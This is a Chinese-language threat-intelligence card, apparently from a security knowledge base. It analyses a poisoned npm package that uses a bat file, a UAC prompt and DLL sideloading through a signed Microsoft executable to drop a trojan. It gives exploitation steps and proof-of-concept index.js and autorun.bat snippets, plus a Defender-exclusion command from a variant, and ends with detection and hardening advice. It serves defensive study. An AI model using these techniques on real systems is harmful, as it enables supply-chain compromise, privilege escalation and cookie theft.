---
id: cloud-cicd-npm-signed-exe-dll-sideload-uac
title: NPM 投毒包捆绑合法签名程序侧加载恶意 DLL：bat 借 UAC 提权诱骗执行
type: scenario
domain: cloud
path: cloud/ci-cd
technique: npm-poisoning-signed-exe-dll-sideload
aliases:
- 投毒包 DLL 侧加载
- 白加黑供应链
- cookie_exporter 侧加载
- msedge.dll 劫持
- UAC 诱骗提权投毒
tags:
- npm
- supply-chain
- dll-sideload
- uac
- windows
- defense-evasion
- cookie-theft
- initial-access
cve: []
severity: high
affected_versions: edgecompatible 2.3.4（恶意包版本）
confidence: high
status: verified
created: '2026-11-11'
updated: '2026-11-11'
verification:
  verified_by: verifier-V515
  verified_at: '2026-11-11T11:38:48+08:00'
  notes: 已对照原文及图08-12核对：edgecompatible 2.3.4 包内 cookie_exporter.exe（Microsoft 签名）/msedge.dll（HYPERLINK 签名、VT revoked-cert）/msedge.dat，index.js spawn bin/autorun.bat，cacls 探权 + Start-Process -Verb RunAs，IDA 中 LoadLibraryA(msedge.dll)+GetProcAddress ExportSpartanCookies，均一致；affected_versions 2.3.4 取自原文 db.json；noblox 变体描述与图24-27（Add-MpPreference 排除、Quasar RAT）一致；dedup 候选仅 related（GUP 侧加载、签名安装器等），非同链。未执行 PoC。
---

## 一句话结论

恶意 NPM 包在 `index.js` 中 `spawn` 包内的 `bin/autorun.bat`：bat 用 `cacls` 判断是否管理员，非管理员时通过 `powershell Start-Process ".\app\cookie_exporter.exe" -Verb RunAs` 弹出 UAC 提示；受害者一旦同意，运行的是具合法签名的微软程序 `cookie_exporter.exe`，但它在启动时按 Windows 默认搜索顺序从同目录加载攻击者放置的同名恶意 `msedge.dll`（DLL 侧加载/白加黑），DLL 再解密同目录 `msedge.dat` 释放下一阶段木马，实现提权与规避杀软。

## 原理

- **投毒包投递**：NPM 包 `index.js` 导出/执行逻辑中用 `child_process.spawn` 启动 `bin/autorun.bat`（包已把 exe、dll、dat 一起打包），把恶意载荷带进开发者主机。
- **UAC 诱骗**：`autorun.bat` 先用 `>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"` 检查当前权限；错误时执行 `powershell start-process ".\app\cookie_exporter.exe" -Verb RunAs`。UAC 弹窗显示的是合法签名程序名（Microsoft），用户更容易点“是”，从而以管理员权限启动。
- **DLL 侧加载（白加黑）**：`cookie_exporter.exe` 是合法签名的 Microsoft Edge 相关组件，其 `WinMain` 中 `LoadLibraryA("msedge.dll")` 后 `GetProcAddress("ExportSpartanCookies")` 并调用。Windows 加载 DLL 时优先搜索应用程序所在目录，因此包内同目录的恶意 `msedge.dll` 会先于系统 DLL 被加载——合法签名 exe 成了攻击者的加载器。
- **签名与载荷**：恶意 `msedge.dll` 带有伪造/已吊销的签名（HYPERLINK TECHNOLOGIES INC，revoked-cert），启动后读取同目录 `msedge.dat` 解密释放下一阶段木马；杀软往往对合法签名 exe 信任度更高，侧加载 DLL 容易逃过静态信任判断。
- **为什么成立**：DLL 搜索顺序（应用目录优先）是 Windows 遗留行为；签名只证明 exe 来源，不保证其同目录依赖 DLL 的完整性；UAC 的提示主体是 exe 的签名信息，用户无法看出同目录 DLL 已被替换。

## 触发条件

- 受害者在 Windows 上安装/加载该投毒包（`index.js` 被执行、或业务调用其导出函数）。
- 包内包含合法签名宿主 exe + 恶意同名 DLL + 加密载荷文件。
- 用户对 UAC 提示点击“是”（或在已提权环境直接运行）。
- 宿主 exe 确实按应用目录相对路径加载同名 DLL（DLL 侧加载成立）。

## 利用步骤

1. 选择一个会从应用目录加载同名 DLL 的合法签名 exe（本例为 Edge 相关组件 `cookie_exporter.exe`），放到投毒包 `bin/app/`。
2. 用同名恶意 DLL（`msedge.dll`）实现宿主需要的导出函数（如 `ExportSpartanCookies`），内部解密并释放 `msedge.dat` 中的下一阶段木马。
3. 编写 `bin/autorun.bat`：`pushd %~dp0` → `cacls` 检查管理员 → 非管理员则 `Start-Process .\app\cookie_exporter.exe -Verb RunAs`。
4. `index.js` 在 `os.platform() === "win32"` 时 `spawn` 该 bat，并吞掉 stderr 中出现的 `start-process` 字样，避免终端暴露。
5. 受害者安装并加载包 → 弹 UAC → 同意后宿主 exe 侧加载恶意 DLL → 下一阶段后门运行。

## PoC

投毒包结构：

```text
edgecompatible/
├── index.js
├── package.json
└── bin/
    ├── autorun.bat
    └── app/
        ├── cookie_exporter.exe   # 合法签名的宿主程序
        ├── msedge.dll            # 恶意同名 DLL（侧加载）
        └── msedge.dat            # 加密的下一阶段载荷
```

`index.js`（片段）：

```javascript
const { spawn } = require('child_process');
const path = require('path');
const os = require("os");

if (os.platform() === "win32") {
  const child = spawn(path.join(__dirname, 'bin', 'autorun.bat'), []);
  child.stderr.on('data', (data) => {
    if (data.toString().indexOf("start-process") !== -1) process.exit();
  });
}
```

`bin/autorun.bat`（片段）：

```bat
@echo off
pushd %~dp0
>nul 2>&1 "%SYSTEMROOT%\system32\cacls.exe" "%SYSTEMROOT%\system32\config\system"
if %errorlevel% neq 0 (
    powershell start-process ".\app\cookie_exporter.exe" -Verb RunAs
    exit /b
)
popd
```

## 变体与关联

- 变体：宿主 exe 可换成任意存在相对路径 DLL 加载的签名程序（浏览器组件、输入法、驱动安装器）；恶意 DLL 需实现宿主调用的导出函数，或通过代理 DLL 转发导出（AheadLib 思路）。
- 变体：同月的另一投毒包用 `postinstall` 执行混淆 JS，下载 bat 后 `Start-Process -Verb RunAs` 自提权（`am_admin` 参数），并用 `Add-MpPreference -ExclusionPath 'C:\'` 关闭 Defender 对整盘的监控，再下载并启动 Quasar RAT——同一“投毒包 → 提权/规避 → 下一阶段”思路的不同实现。
- 关联：[[cloud-cicd-npm-postinstall-supply-chain-poisoning]]（npm 安装期投毒投放 RAT）、[[cloud-cicd-npm-dns-chunk-exfil-hostinfo]]（同月情报中的信息外带变体）、DLL 侧加载逆向案例见 silverfox 系列卡片。
- 边界：宿主程序使用绝对路径/签名校验加载 DLL、或从 System32 优先加载时不成立；UAC 被拒绝或关闭时链断；EDR 对同目录无签名 DLL 加载告警可拦截。

## 检测与防御

- 检测：NPM 包内同时包含 `.exe`、`.dll`、`.dat` 且 index.js 以 `spawn` 调用 `.bat`；安装目录出现非官方同名 DLL（版本/签名与宿主不匹配）。
- 检测：`powershell start-process ... -Verb RunAs` 的父进程是 node/npm；UAC 提权后进程从用户可写目录加载 DLL（模块加载路径不在 System32）。
- 加固：应用目录写保护、DLL 安全加载搜索顺序（`SetDefaultDllDirectories`/`LoadLibraryEx` 绝对路径）；监控 UAC 提权事件与随后模块加载；禁用/限制 `--ignore-scripts` 之外的安装脚本执行。
- 响应：隔离主机、删除投毒包与落地文件、轮换用户凭据与浏览器 Cookie。
